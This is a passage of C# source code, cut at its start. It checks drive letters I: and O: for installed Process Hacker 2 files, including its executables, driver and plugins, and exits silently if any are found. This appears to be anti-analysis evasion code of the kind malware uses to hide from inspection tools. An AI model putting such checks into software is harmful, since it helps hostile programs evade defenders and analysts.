            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"I:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
            #region[O]
            if (File.Exists(@"O:\Program Files\Process Hacker 2\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\kprocesshacker.sys"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\ExtendedServices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\ExtendedTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\HardwareDevices.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\NetworkTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\OnlineChecks.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\SbieSupport.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\ToolStatus.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\Updater.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\UserNotes.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\plugins\WindowExplorer.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\x86\ProcessHacker.exe"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\x86\plugins\DotNetTools.dll"))
            {
                Environment.Exit(0);
            }
            else
            if (File.Exists(@"O:\Program Files\Process Hacker 2\peview.exe"))
            {
                Environment.Exit(0);
            }
            #endregion
        }
    }
}